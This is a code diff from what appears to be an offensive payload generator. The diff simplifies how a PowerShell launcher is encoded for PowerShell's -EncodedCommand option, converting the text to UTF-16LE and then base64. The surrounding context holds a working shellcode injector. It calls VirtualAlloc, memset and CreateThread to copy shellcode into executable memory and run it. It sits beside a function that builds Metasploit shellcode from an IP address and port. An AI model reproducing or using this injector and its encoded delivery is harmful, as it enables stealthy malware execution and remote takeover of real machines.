@@ -1251,25 +1251,10 @@ def generate_powershell_alphanumeric_payload(payload,ipaddr,port, payload2):
 
     # powershell command here, needs to be unicoded then base64 in order to use encodedcommand
     powershell_command = ('''$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };''' % (shellcode))
-    ##############################################################################################################################################################################
-    # there is an odd bug with python unicode, traditional unicode inserts a null byte after each character typically.. python does not so the encodedcommand becomes corrupt
-    # in order to get around this a null byte is pushed to each string value to fix this and make the encodedcommand work properly
-    ##############################################################################################################################################################################
 
-    # blank command will store our fixed unicode variable
-    blank_command = ""
-    # loop through each character and insert null byte
-    for char in powershell_command:
-        # insert the nullbyte
-        blank_command += char + "\x00"
+    return base64.b64encode(powershell_command.encode('utf_16_le'))
 
-    # assign powershell command as the new one
-    powershell_command = blank_command
-    # base64 encode the powershell command
-    powershell_command = base64.b64encode(powershell_command)
-    # return the powershell code
-    return powershell_command
-
+# generate base shellcode
 def generate_shellcode(payload,ipaddr,port):
     msf_path = meta_path()
     # generate payload
